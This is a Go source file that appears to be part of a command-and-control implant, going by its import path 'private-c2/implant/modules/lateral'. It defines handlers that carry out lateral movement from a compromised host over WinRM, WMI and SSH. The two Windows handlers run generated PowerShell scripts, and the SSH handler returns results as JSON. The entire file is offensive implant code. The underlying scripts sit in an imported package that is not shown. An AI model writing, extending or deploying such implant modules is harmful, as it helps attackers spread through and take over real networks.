package main

import (
	"context"
	"fmt"
	"runtime"

	"github.com/azizbinmohammad/private-c2/implant/modules/lateral"
)

func handleLateralWinRM(ctx context.Context, args string) (string, error) {
	req, err := lateral.ParseWinRMRequest(args)
	if err != nil {
		return "", err
	}
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("lateral_winrm requires Windows PowerShell Remoting")
	}
	return runPowershell(ctx, lateral.WinRMScript(req))
}

func handleLateralWMI(ctx context.Context, args string) (string, error) {
	req, err := lateral.ParseWMIRequest(args)
	if err != nil {
		return "", err
	}
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("lateral_wmi requires Windows PowerShell")
	}
	return runPowershell(ctx, lateral.WMIScript(req))
}

func handleLateralSSH(ctx context.Context, args string) (string, error) {
	req, err := lateral.ParseSSHRequest(args)
	if err != nil {
		return "", err
	}
	result, err := lateral.SSH(ctx, req)
	if err != nil {
		return "", err
	}
	out, err := marshalJSON(result)
	if err != nil {
		return "", fmt.Errorf("encoding lateral_ssh result: %w", err)
	}
	return out, nil
}
